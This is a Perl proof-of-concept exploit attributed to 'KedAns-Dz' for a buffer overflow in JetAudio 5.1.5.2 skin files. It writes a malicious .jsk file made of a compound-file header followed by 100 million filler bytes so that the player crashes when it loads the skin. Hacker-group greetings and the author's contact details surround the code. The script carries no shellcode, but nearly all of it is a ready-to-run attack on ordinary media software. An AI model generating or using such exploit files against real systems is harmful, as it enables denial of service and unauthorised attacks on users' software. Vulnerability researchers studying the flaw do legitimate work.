#!/usr/bin/perl

###
# Title : JetAudio 'Skins' V<=5.1.5.2 Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# Tested on : windows XP SP3 Français & Arabic
# Target :  JetAudio Version 5.1.5.2602
###

# Note : This Exploit BOF is Special Greets to Member ' Overfolw ' From sec4ever.com

#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");

print "\n\n".                  
      "          ||========================================||\n".
	  "      ||                                        ||\n".
	  "      ||   JetAudio 'Skins' V <= 5.1.5.2        ||\n".
	  "      ||      Exploit Buffer Overflow           ||\n".
	  "      ||    Created BY KedAns-Dz                ||\n".
	  "      ||   ked-h(at)hotmail(dot)com             ||\n".
	  "      ||                                        ||\n".
	  "      ||========================================||\n\n\n";
sleep(2);
print "\n";
print " [!] Please Wait Till c0de Generate...\n";
my $ked = "\x41" x 100000000 ; # Integer Overflow
my $Buf = 
"\xd0\xcf\x11\xe0\xa1\xb1\xa1\xe1\x00\x00\x00\x00\x00\x00\x00\x00". # Skin index
"\x00\x00\x00\x00\x00\x00\x00\x00\x3e\x00\x03\x00\xfe\xff\x00\x00\x00".
"$ked"; # end Skin index
$file = "KedSkinX.jsk"; # Evil File ( Jet.SKin) 
open (F ,">$file");
print F $Buf;
sleep (2);
print "\n [+] Creat File : $file , Succesfully ! \n";
close (F);

#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================
# GreetZ to : Islampard * Dr.Ride * Zaki.Eng * BadR0 * NoRo FouinY * Red1One
# XoreR * Mr.Dak007 * Hani * TOnyXED * Fox-Dz * Massinhou-Dz ++ all my friends ;
# > Algerians <  [D] HaCkerS-StreeT-Team [Z] > Hackers <
# My Friends on Facebook : Nayla Festa * Dz_GadlOl * MatmouR13 ...all Others
# 4nahdha.com : TitO (Dr.Ride) *  MEN_dz * Mr.LAK (Administrator) * all members ...
# sec4ever.com members Dz : =>>
#  Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz ... all Others
# hotturks.org : TeX * KadaVra ... all Others
# Kelvin.Xgr ( kelvinx.net)
#===========================================================================
